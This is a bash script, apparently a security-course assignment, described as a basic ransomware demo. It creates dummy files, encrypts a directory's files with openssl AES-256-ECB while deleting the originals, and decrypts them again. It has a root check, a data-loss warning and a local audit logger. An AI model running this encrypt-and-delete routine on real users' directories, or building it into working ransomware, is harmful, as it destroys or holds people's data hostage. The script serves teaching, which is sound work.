#!/bin/bash
# Assignment 5: basic ransomware demo (create / encrypt+delete / decrypt).
#
# Fixed from the original script in this directory's git history:
#  - "-n <count>" stored its value in $file_num but create_files() read
#    $filenum, so -n silently created nothing.
#  - every directory was forced under "~/", so "-d /tmp/lab" meant
#    "~/tmp/lab" instead of the path the caller gave.
#  - $file and $pass were unquoted, breaking on filenames or passwords
#    containing spaces or glob characters.
#  - "rm -rf" ran unconditionally, including when openssl had just failed,
#    so a bad password could delete originals without producing a readable
#    replacement.
#  - -d meant both "directory" (per the brief's own usage examples) and
#    "decrypt" depending on which example you read; this version keeps -d
#    as "directory" everywhere and adds a separate -x for "decrypt".
#  - LD_PRELOAD pointed at a hardcoded path on the original machine
#    ("~/Desktop/Security_Systems/5th_assignment/logger.so").
set -u

usage() {
	cat <<'EOF'
Usage:
  ./ransomware.sh -n <num_of_files> -d <directory>
  ./ransomware.sh -e -d <directory> -p <password>
  ./ransomware.sh -x -d <directory> -p <password>
  ./ransomware.sh -h

Options:
  -n <count>      Create <count> throwaway "fileN.txt" files in <directory>
  -d <directory>  Directory to operate on (required for every mode)
  -e              Encrypt every file in <directory>, then delete the originals
  -x              Decrypt every "*.encrypt" file in <directory>
  -p <password>   Password for -e / -x (aes-256-ecb, as in the assignment brief)
  -h              This help message

WARNING: -e deletes the plaintext files it just encrypted. Only point this
at a directory of files you created for the demo.
EOF
}

die() {
	echo "$*" >&2
	exit 1
}

# Refuse to run as (or effectively as) root.
if [ "$(id -u)" = 0 ] || [ -w / ]; then
	die "No root is allowed!"
fi

mode=""
dir=""
pass=""
count=""

while getopts ":n:d:p:exh" opt; do
	case "$opt" in
	n) count="$OPTARG" ;;
	d) dir="$OPTARG" ;;
	p) pass="$OPTARG" ;;
	e) mode="encrypt" ;;
	x) mode="decrypt" ;;
	h) usage; exit 0 ;;
	:) die "Option -$OPTARG requires an argument." ;;
	\?) die "Unknown option: -$OPTARG" ;;
	esac
done

if [ -z "$dir" ]; then
	usage
	die "A directory (-d) is required."
fi
if [ ! -d "$dir" ]; then
	die "Not a directory: $dir"
fi

# Prefer logger.so next to this script (built by `make logger` in this
# directory); fall back to running unaudited if it is not there yet.
script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
if [ -f "$script_dir/logger.so" ]; then
	export LD_PRELOAD="$script_dir/logger.so"
else
	echo "Warning: $script_dir/logger.so not found; running without the access-control logger." >&2
fi

create_files() {
	if ! [[ "$count" =~ ^[0-9]+$ ]] || [ "$count" -eq 0 ]; then
		die "-n requires a positive integer."
	fi
	local i
	for ((i = 1; i <= count; i++)); do
		: >"$dir/file$i.txt" || die "Could not create $dir/file$i.txt"
	done
	echo "Created $count file(s) in $dir"
}

encrypt_dir() {
	[ -n "$pass" ] || die "-e requires -p <password>."
	shopt -s nullglob
	local file encrypted=0 failed=0
	for file in "$dir"/*; do
		[ -f "$file" ] || continue
		case "$file" in
		*.encrypt) continue ;; # do not re-encrypt our own output
		esac
		if openssl enc -aes-256-ecb -in "$file" -out "$file.encrypt" -k "$pass"; then
			rm -f -- "$file"
			encrypted=$((encrypted + 1))
		else
			rm -f -- "$file.encrypt" # don't leave a partial/empty ciphertext behind
			failed=$((failed + 1))
			echo "Failed to encrypt: $file" >&2
		fi
	done
	echo "Encrypted $encrypted file(s), $failed failure(s), in $dir"
	[ "$failed" -eq 0 ]
}

decrypt_dir() {
	[ -n "$pass" ] || die "-x requires -p <password>."
	shopt -s nullglob
	local file original decrypted=0 failed=0
	for file in "$dir"/*.encrypt; do
		[ -f "$file" ] || continue
		original="${file%.encrypt}"
		if openssl enc -d -aes-256-ecb -in "$file" -out "$original" -k "$pass"; then
			rm -f -- "$file"
			decrypted=$((decrypted + 1))
		else
			rm -f -- "$original" # don't leave a corrupt partial plaintext behind
			failed=$((failed + 1))
			echo "Failed to decrypt: $file" >&2
		fi
	done
	echo "Decrypted $decrypted file(s), $failed failure(s), in $dir"
	[ "$failed" -eq 0 ]
}

case "$mode" in
"")
	if [ -n "$count" ]; then
		create_files
	else
		usage
		die "Choose -n, -e or -x."
	fi
	;;
encrypt) encrypt_dir ;;
decrypt) decrypt_dir ;;
esac
